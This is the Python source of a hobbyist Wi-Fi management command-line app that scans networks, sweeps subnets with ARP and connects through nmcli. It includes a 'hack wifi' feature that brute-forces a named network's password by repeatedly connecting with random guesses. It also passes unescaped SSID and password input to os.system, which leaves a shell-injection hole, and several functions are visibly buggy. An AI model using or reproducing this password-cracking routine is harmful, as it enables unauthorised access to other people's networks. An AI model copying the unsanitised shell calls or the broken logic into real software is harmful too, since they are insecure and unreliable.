
import keyboard
from scapy.all import *
import re
from scapy.layers.l2 import ARP, Ether


class HardNetworkManagement():
    def __init__(self, netdevice):
        print("01010101010101010101010101010101010101010101010101010101010101010101010101010")
        print("01010101010101010101010101010101010101010101010101010101010101010101010101010")
        print("010  101010101010  1010    10101010101  0101    010101010101010101010     010")
        print("010  101010101010  1010  10  101010101  0101  01  010101010101010101  01  010")
        print("010  101010101010  1010  101  01010101  0101  010  1010101010101010  101  010")
        print("010  101010101010  1010  1010  1010101  0101  0101  01010101010101  0101  010")
        print("010  101010101010  1010  10101  010101  0101  01010  101010101010  10101  010")
        print("010                1010  101010  10101  0101  010101  0101010101  010101  010")
        print("010  101010101010  1010  1010101  0101  0101  0101010  10101010  1010101  010")
        print("010  101010101010  1010  10101010  101  0101  01010101  010101  01010101  101")
        print("010  101010101010  1010  101010101  01  0101  010101010  1010  101010101  010")
        print("010  101010101010  1010  1010101010  1  0101  0101010101  01  0101010101  010")
        print("010  101010101010  1010  10101010101    0101  01010101010    10101010101  010")
        print("01010101010101010101010101010101010101010101010101010101010101010101010101010")
        print("01010101010101010101010101010101010101010101010101010101010101010101010101010")
        self.name = "**************Hard Network Management App By Youssef Benabida****************"
        print(      "*************If there's something wrong, it's on your computer***************")
        self.money_nbr = 1 # nombre of commands with "money" word
        self.netdevice = netdevice
        print(self.name)
    # The global method of the app
    def push_me(self, command=""):
        available_commands = {"disconnect_from_wifi": "disconnect from wifi", "restart": "restart", "go_back": "go back", "get_mac_address": "get mac address", "disactive_wifi": "disactive wifi", "active_wifi": "active wifi", "hack_wifi": "hack wifi", "connect_to_wifi": "connect to wifi", "scanne_wifi": "scanne wifi", "help" : "help", "exit": "exit", "money": "money"}
        if command == "":
            command = str(input("order sir: ")).strip()
        # exit the programme
        if command[:len(available_commands["exit"])].lower() == available_commands["exit"]:
            print("see you :)")
            return
        # Restart the app
        if command[:len(available_commands["restart"])].lower() == available_commands["restart"]:
            return self.restart()
        if command[:len(available_commands["disconnect_from_wifi"])].lower() == available_commands["disconnect_from_wifi"]:
            disconnect = self.disconnect_from_wifi()
            if disconnect == 2:
                print("I didn't find any connexion to disconnect")
                return self.push_me()
            else:
                if disconnect == 1:
                    print("disconnected")
                    return self.push_me()
                else:
                    print("I can't disconnect :{")
                    self.push_me()
        # Find mac address by ip address for one ip or for all the network unsing ip/mask
        if command[:len(available_commands["get_mac_address"])].lower() == available_commands["get_mac_address"]:
            ip = str(input("enter ip address to find his mac owner: ")).strip().lower()
            if ip[:len(available_commands["exit"])] == available_commands["exit"]:
                print("see you :) ")
                return
            if ip[:len(available_commands["go_back"])] == available_commands["go_back"]:
                return self.push_me()
            if ip[:len(available_commands["restart"])].lower() == available_commands["restart"]:
                print("restarting...")
                return os.system("sudo -S python3 main.py")
            try:
                mask = ip.split("/")[1]
            except:
                mask = None
            if mask is not None and int(mask) > 0:
                ip = ip.split("/")[0]
                self.scanne_all_devices_using_wifi(ip, mask)
                return self.push_me(available_commands["get_mac_address"])
            ip_add_range_pattern = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
            if ip_add_range_pattern.search(ip):
                result = self.get_mac(ip)
                if result == "not found":
                    print(result)
                    return self.push_me(available_commands["get_mac_address"])
                else:
                    print(result)
                    return self.push_me(available_commands["get_mac_address"])
            else:
                print("enter a valide ip address like 192.168.1.38")
                return self.push_me(available_commands["get_mac_address"])
        # active wifi
        if command[:len(available_commands["active_wifi"])].lower() == available_commands["active_wifi"]:
            self.active_wifi()
            return self.push_me()
        # desactive wifi
        if command[:len(available_commands["disactive_wifi"])].lower() == available_commands["disactive_wifi"]:
            self.desactive_wifi()
            return self.push_me()
        # connect to wifi
        if command[:len(available_commands["connect_to_wifi"])].lower() == available_commands["connect_to_wifi"]:
            if self.__scanne_available_wifi(command[16:].strip()):
                print(command[16:].strip() + " is found")
                password = str(input("enter the password of the wifi -- " + command[16:].strip() + " -- : ")).strip()
                if password[:len(available_commands["go_back"])] == available_commands["go_back"]:
                    return self.push_me()
                if password[:len(available_commands["exit"])] == available_commands["exit"]:
                    print("see you :)")
                    return
                if password[:len(available_commands["restart"])].lower() == available_commands["restart"]:
                    print("restarting...")
                    return os.system("sudo -S python3 main.py")
                if self.connect_to_wifi(command[16:].strip(), password):
                    print("connected")
                    return self.push_me()
                else:
                    print("password incorrect")
                    return self.push_me(available_commands["connect_to_wifi"] + " " + command[16:].strip())
            else:
                print("wifi not found")
                return self.push_me()

        # try to find wifi password
        if command[:9].lower() == available_commands["hack_wifi"]:
            if len(command[10:].strip()) > 0:
                if self.__scanne_available_wifi(command[10:].strip()):
                    level = -1
                    lenght = 0
                    while not level in [0, 1, 2]:
                        level = str(input("enter level of hardness bitween (0/1/2): ")).strip().lower()
                        # Go back to home commande of the app
                        if level[:len(available_commands["go_back"])] == available_commands["go_back"]:
                            return self.push_me()
                        # Exit the app
                        if level[:len(available_commands["exit"])] == available_commands["exit"]:
                            print("see you :)")
                            return
                        # Restart the app
                        if level[:len(available_commands["restart"])].lower() == available_commands["restart"]:
                            print("restarting...")
                            return os.system("sudo -S python3 main.py")
                        level = int(level)
                    else:
                        while not lenght > 7:
                            lenght = str(input("enter the lenght of the password ")).strip().lower()
                            # Go back to home commande of the app
                            if lenght[:len(available_commands["go_back"])] == available_commands["go_back"]:
                                return self.push_me()
                            # Exit the app
                            if lenght[:len(available_commands["exit"])] == available_commands["exit"]:
                                print("see you :)")
                                return
                            # Restart the app
                            if lenght[:len(available_commands["restart"])].lower() == available_commands["restart"]:
                                print("restarting...")
                                return os.system("sudo -S python3 main.py")
                            lenght = int(lenght)
                            if lenght < 8:
                                print("enter the lenght of the password ")
                        else:
                            self.find_wifi_password(command[10:].strip(), level, lenght)
                            self.push_me(available_commands["hack_wifi"])
                else:
                    print("this wifi is not found")
                    return self.push_me(available_commands["hack_wifi"])
            else:
                wifi = str(input("enter the name of the wifi to hacked : ")).strip()
                if wifi[:len(available_commands["go_back"])] == available_commands["go_back"]:
                    return self.push_me()
                # Exit the app
                if wifi[:len(available_commands["exit"])] == available_commands["exit"]:
                    print("see you :)")
                    return
                # Restart the app
                if wifi[:len(available_commands["restart"])].lower() == available_commands["restart"]:
                    print("restarting...")
                    return os.system("sudo -S python3 main.py")
                if len(wifi.strip()) > 0:
                    self.push_me(available_commands["hack_wifi"] + " " + wifi)
                else:
                    return self.push_me(available_commands["hack_wifi"])

        # Find available wifi
        if command[:len(available_commands["scanne_wifi"])].lower() == available_commands["scanne_wifi"]:
            print("scanning wifi...")
            all_available_wifi = self.__scanne_available_wifi()
            if not all_available_wifi == None:
                for j in range(len(all_available_wifi)):
                            print("(" + str(j) + ")", all_available_wifi[j])
            return self.push_me()
        # this parte is just for kiding :)
        if command.find("money") != -1 or command.find("argent") != -1 or command.find("flos") != -1 or command.find("flous") != -1 or command.find("l3a9a") != -1 or command.find("omar") != -1 or command.find("moka") != -1:
            print(self.money_nbr)
            if self.money_nbr < 4:
                print("i am a programme not a afret :{")
                self.money_nbr += 1
                return self.push_me()
            else:
                print("layhdik rani 4ir programme ")
                return self.push_me()
        # See help
        if command[:4].lower() == "help":
            print("command 1: get mac address ip -- ip/mask -- : to scanne the network or scanne ip ip to scanne just oune ip")
            print("command 2: active wifi : to activate the wifi")
            print("command 3: disactive wifi : to disactivate the wifi")
            print("command 4: connect to wifi -- wifi name -- : to connect to the wifi")
            print("command 5: go back : to return to the home command line the wifi")
            print("command 6: restart : to restart HNM")
            print("command 7: exit : to exit HNM")
            print("command 8: scanne wifi : to scanne the available wifi")
            print("command 9: hack wifi -- wifi name -- : to try to find the password of an wifi")
            print("command 7: disconnect from wifi : to disconnect from the current wifi connexion")

            return self.push_me()
        else:
            print("commande incorrect enter help to see available commandes")
            return self.push_me()
    # Restart method
    def restart(self):
        print("restarting...")
        return os.system("sudo -S python3 main.py")

    # this method find mac address by address ip it sends ARP
    def get_mac(self, ip):
        if self.__scanne_available_wifi(None, True):
            # Create arp packet object. pdst - destination host ip address
            arp_request = ARP(pdst=ip)
            # Create ether packet object. dst - broadcast mac address.
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            # Combine two packets in two one
            arp_request_broadcast = broadcast / arp_request
            # Get list with answered hosts
            try:
                answered_list = srp(arp_request_broadcast, timeout=1,
                                    verbose=False)[0]
                 # Return host mac address
                return str(answered_list[0][1].hwsrc)
            except:
                return "not found"
        else:
            return "your machine is not connected to any network"
    # This methid find all mac addresses by ip address of the network and the mask of it
    def scanne_all_devices_using_wifi(self, begin_ip="255.255.255.255", mask="24"):
        mask_address_ip = ""
        a, b, c, d = begin_ip.split(".")
        a, b, c, d = int(a), int(b), int(c), int(d)
        ma, mb, mc, md = a, b, c, d
        for i in range(int(mask)):
            if i < 8:
                md += 2**i
            if md > 255:
                mc += 1
                md = md % 255
            if 16 > i > 7:
                mc += 2**(i-8)
            if mc > 255:
                mb += 1
                mc = c % 255
            if 24 > i > 15:
                mb += 2**(i-16)
            if mb > 255:
                ma += 1
                mb = mb % 255
            if 32 > i > 23:
                ma += 2**(i-24)
            if ma > 255:
                ma = 255
        mask_address_ip = str(ma) + "." + str(mb) + "." + str(mc) + "." + str(md)
        print("mask address: " + mask_address_ip)
        print("I am searching...")
        address_ip = str(a) + "." + str(b) + "." + str(c) + "." + str(d)
        devices = []
        while not address_ip == mask_address_ip:
            d += 1
            if d > 255:
                c += 1
                d = d % 255
            if c > 255:
                b += 1
                c = c % 255
            if b > 255:
                a += 1
                b = b % 255
            if a > 255:
                a = 255
            if not d == 255 and not d == 0:
                address_ip = str(a) + "." + str(b) + "." + str(c) + "." + str(d)
                test = self.get_mac(address_ip)
                if not test == "not found":
                    devices.append(test)
                    print(" device " + str(len(devices)))
            if keyboard.is_pressed('s'):  # if key 's' is pressed the searching well be stoped
                print('Stop searching')
                break  # finishing the loop

        else:
            if len(devices) > 0:
                print("I found " + str(len(devices)) + " devices:")
                for dev in devices:
                    print(" - " + dev)
            else:
                print("I didn't find any device")

    def disconnect_from_wifi(self):
        if not self.__scanne_available_wifi(None, True):
            return 2
        else:
            all_available_wifi = self.__scanne_available_wifi()
            for wifi in all_available_wifi:
                if wifi.use == "connected":
                    # command_output = str(subprocess.run(["nmcli c", "down", "\"" + wifi.ssid + "\" "], capture_output=True, shell=True).stdout.decode("utf-8"))
                    os.system("nmcli c down \"" + wifi.ssid + "\" ")
                    #if command_output.strip() == "Erreur : « " + wifi.ssid + " » n'est pas une connexion active.":
                    if self.__scanne_available_wifi(None, True):
                        os.system("nmcli c down \"" + self.netdevice + "\" ")
                        return 1
                    else:
                        return 1
            return 0

    def connect_to_wifi(self, ssid, password):
        if self.active_wifi(True):
            if self.disconnect_from_wifi() in [1, 2]:
                if password == "":
                    cmd = "nmcli --ask con up id " + ssid
                else:
                    cmd = "nmcli dev wifi connect \"" + ssid + "\" password \"" + password + "\" ifname " + self.netdevice
                try:
                    os.system(cmd)
                except:
                    os.system(cmd)
                if self.__scanne_available_wifi(ssid, True):
                    return True
                else:
                    return False
            else:
                print('I can\'t disconnect from the last connexion')
                return False
        else:
            print("wifi is off enter the commande -- active wifi -- to activate it")
            return False

    def active_wifi(self, ask=False):
        try:
            wifi_status = str(subprocess.run(["wifi", "status"], capture_output=True, shell=True).stdout.decode("utf-8"))
        except:
            wifi_status = "error = error"
        wifi_status = wifi_status.split("=")
        wifi_status = wifi_status[1].strip()
        if wifi_status[:2] == "on":
            if ask:
                return True
            print("The wifi is already ON")
        else:
            if wifi_status[:3] == "off":
                if ask:
                    return False
                else:
                    try:
                        cmd = "sudo nmcli radio wifi on"
                        os.system("sudo -S true")
                        os.system("sudo " + cmd)
                        print("wifi is now on")
                    except:
                        print("System error")
            else:
                print("System error ")

    def desactive_wifi(self):
        if not self.active_wifi(True):
            print("The wifi is already OFF")
        else:
            try:
                cmd = "sudo nmcli radio wifi off"
                os.system("sudo -S true")
                os.system("sudo " + cmd)
            except:
                print("System error")

    def __scanne_available_wifi(self, ssid=None, ask_is_connecetd=False):
        if self.active_wifi(True):
            try:
                command_output = str(subprocess.run(["nmcli dev wifi", "wlan", "show", "profiles"], capture_output=True, shell=True).stdout.decode("utf-8"))
                result = command_output.split("\n")
                all_available_wifi = self.set_wifi_info(result)
                if ssid is None:
                    if ask_is_connecetd:
                        for net in all_available_wifi:
                            if net.use == "connected":
                                return True
                            else:
                                return False
                    else:

                        return all_available_wifi
                else:
                    for net in all_available_wifi:
                        if net.ssid == ssid:
                            if ask_is_connecetd:
                                if net.use == "connected":
                                    return True
                                else:
                                    return False
                            return True
                    else:
                        return False
            except:
                print("System error")
        else:
            print("the wifi is not activated enter the next command to activate it -- active wifi -- ")
            return None

    def set_wifi_info(self, result):
        use_begin = result[0].find("IN-USE")
        use_end = result[0].find("BSSID")
        bssid_begin = result[0].find("BSSID")
        bssid_end = result[0].find(" SSID") + 1
        ssid_begin = result[0].find(" SSID") + 1
        ssid_end = result[0].find("MODE")
        mode_begin = result[0].find("MODE")
        mode_end = result[0].find("CHAN")
        chan_begin = result[0].find("CHAN")
        chan_end = result[0].find("RATE")
        rate_begin = result[0].find("RATE")
        rate_end = result[0].find("SIGNAL")
        signal_begin = result[0].find("SIGNAL")
        signal_end = result[0].find("BARS")
        bars_begin = result[0].find("BARS")
        bars_end = result[0].find("SECURITY")
        security_begin = result[0].find("SECURITY")
        all_available_wifi = []
        for i in range(1, len(result)):
            if len(result[i].strip()) > 1:
                wifi = self.Wifi()
                if result[i][use_begin:use_end].strip() == "*":
                    wifi.use = "connected"
                else:
                    wifi.use = "not connected"
                wifi.bssid = result[i][bssid_begin:bssid_end].strip()
                wifi.ssid = result[i][ssid_begin:ssid_end].strip()
                wifi.mode = result[i][mode_begin:mode_end].strip()
                wifi.chan = result[i][chan_begin:chan_end].strip()
                wifi.rate = result[i][rate_begin:rate_end].strip()
                wifi.signal = result[i][signal_begin:signal_end].strip()
                wifi.bars = result[i][bars_begin:bars_end].strip()
                wifi.security = result[i][security_begin:].strip()
                all_available_wifi.append(wifi)
        return all_available_wifi

    def find_wifi_password(self, wifiname, level, passlenght):
        rander = self.RandomPassword()
        test = rander.random_password(passlenght, level)
        print("press the key -- s -- on the keyboard to stop hacking")
        while not self.connect_to_wifi(wifiname, test) and not len(rander.rand_passwords) > 10**passlenght:
            if keyboard.is_pressed('s'):  # if key 's' is pressed the hacking well be stoped
                print('Stop Hacking')
                break  # finishing the loop
            print(len(rander.rand_passwords))
            #test = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(j))
            print("Try with " + test)
            test = rander.random_password(passlenght, level)

    class Wifi:
        def __init__(self):
            self.use = ""
            self.bssid = ""
            self.ssid = ""
            self.mode = ""
            self.chan = ""
            self.rate = ""
            self.signal = ""
            self.bars  =""
            self.security = ""

        def __str__(self):
            return " ssid: " + self.ssid + " etat: " + self.use + " bssid: " + self.bssid + " mode: " + self.mode + " chan: " + self.chan + " rate: " + self.rate + " bars: " + self.bars + " signal: " + self.signal + " security: " + self.security

    class RandomPassword:

        def __init__(self):
            self.rand_passwords = []
            self.numbers = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
            self.symbols = ["@", "#", " ", "_", "-", "*", "/", "."]
            self.characters = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q",
                               "r", "s", "t", "u", "v", "w", "x", "y", "z"]

        def random_password(self, length, level):
            rand_password = ""
            entities = []
            if level == 2:
                entities = self.numbers + self.characters + self.symbols
            else:
                if level == 1:
                    entities = self.numbers + self.characters
                else:
                    if level == 0:
                        entities = self.numbers
            for i in range(length):
                if random.choice([True, False]):
                    rand_password += random.choice(entities).upper()
                else:
                    rand_password += random.choice(entities).lower()
            for i in range(len(self.rand_passwords)):
                if rand_password == self.rand_passwords[i]:
                    return rand_password(length)
            self.rand_passwords.append(rand_password)
            return rand_password
